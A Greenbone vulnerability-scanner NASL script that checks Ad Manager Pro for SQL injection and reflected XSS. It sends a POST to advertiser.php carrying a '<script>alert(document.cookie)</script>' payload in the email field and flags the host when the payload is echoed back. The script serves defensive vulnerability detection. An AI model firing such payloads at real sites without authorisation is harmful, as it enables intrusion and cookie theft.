# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803019");
  script_version("2023-12-13T05:05:23+0000");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2023-12-13 05:05:23 +0000 (Wed, 13 Dec 2023)");
  script_tag(name:"creation_date", value:"2012-08-30 17:10:10 +0530 (Thu, 30 Aug 2012)");
  script_name("Ad Manager Pro Multiple SQL Injection And XSS Vulnerabilities");

  script_xref(name:"URL", value:"http://secunia.com/advisories/50427");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/20785");
  script_xref(name:"URL", value:"http://www.securelist.com/en/advisories/50427");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/115877/admanagerpro-sqlxss.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"insight", value:"- Input passed via the 'X-Forwarded-For' HTTP header field is not
  properly sanitised before being used in SQL queries.

  - Inputs passed via 'username', 'password' 'image_control' and 'email'
  parameters to 'advertiser.php' and 'publisher.php' is not properly
  sanitised before being returned to the user.");

  script_tag(name:"solution", value:"Upgrade to the latest version");

  script_tag(name:"summary", value:"Ad Manager Pro is prone to multiple sql injection and cross site scripting vulnerabilities.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to manipulate SQL
  queries by injecting arbitrary SQL code or execute arbitrary HTML and
  script code in a user's browser session in context of affected website.");

  script_tag(name:"affected", value:"Ad Manager Pro");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  script_xref(name:"URL", value:"http://www.phpwebscripts.com/ad-manager-pro/");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port(default:80);
if(!http_can_host_php(port:port))
  exit(0);

useragent = http_get_user_agent();
host = http_host_name(port:port);

foreach dir (make_list_unique("/admanagerpro", "/AdManagerPro", "/ad", "/", http_cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  res = http_get_cache(item:string(dir, "/index.php"), port:port);

  if(res && res =~ "^HTTP/1\.[01] 200" &&
     res =~ "Powered by .*www\.phpwebscripts\.com")
  {
    url = dir + '/advertiser.php';

    postdata = "action=password_reminded&email=1234@5555.com%22/>"+
               "<script>alert(document.cookie)</script>&B1=Remind+me";

    req = string("POST ", url, " HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "User-Agent: ", useragent, "\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(postdata), "\r\n",
                 "\r\n", postdata);
    res = http_keepalive_send_recv(port:port, data:req);

    if(res && res =~ "^HTTP/1\.[01] 200" &&
       "<script>alert(document.cookie)</script>" >< res &&
       res =~ "Powered by .*www\.phpwebscripts\.com")
    {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);
